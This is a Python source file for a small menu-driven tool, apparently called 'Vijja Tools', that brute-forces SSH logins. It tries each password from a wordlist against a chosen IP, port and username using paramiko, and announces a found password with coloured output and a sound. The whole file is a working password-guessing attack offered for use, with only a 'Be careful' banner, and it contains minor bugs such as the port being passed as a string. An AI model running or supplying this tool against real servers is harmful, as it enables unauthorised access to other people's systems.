import os,socket,sys,paramiko
import termcolor as color
from playsound import playsound

def fileOpening(pwFile):
    """
    1.This function work for opening file and need to give file directory.
    2. this function read data line by line and also strip.
    3. This function will call (connection) function with password parameter.
    *************************************************************************
                *******************************************
    """
    try:
        with open(pwFile, 'r') as pwfile:
            for pw in pwfile.readlines():
                password = pw.strip()
                status = connection(password)
                if status == 0:
                    print( color.colored('Password is {0}'.format(password),'green'))
                    playsound('passwordFound.mp3')
                    break
                elif status == 1:
                    print(color.colored("Password Not found {}".format(password),'blue'))
                elif status == 2:
                    print("Socket Errors")
                    sys.exit(1)


    except ValueError as err:
        print(err)
    else:
        print("Brutforcing Done")


def connection(password,code=0):
    """
    1. This function will connect to SSH
    2. This function needed 4 parameter
    3. Will reuturn  0 if worked properly.
    """
    ssh=paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip , port =myPort , username=username , password=password)
    except paramiko.AuthenticationException:
        code=1
    except socket.error as err:
        code=2
    ssh.close()
    return code

if __name__=="__main__":
    try:
        print(color.colored(("Welcome to Vijja Tools :> This is main Page\nBe careful if you are using this tools"),'green'))
        print(color.colored(("[1] Press 1 If you want to use normal bruteforce tool"), 'red'))
        print(color.colored(("[2] Press 1 If you want to use Vulnerable tool"), 'yellow'))

        userinput = int(input("Please Enter number :>"))
        if userinput == 1:
            ip = input("Input IP address>:")
            username = input("Input username>:")
            pwFile = input("Password directory>:")
            myPort = input("Enter  port>:")
            print(color.colored((fileOpening.__doc__),'blue'))
            fileOpening(pwFile)

        elif userinput == 2:
            print("This will be upgrade in version2!")
    except KeyboardInterrupt as err:
        print(err)
        exit(1)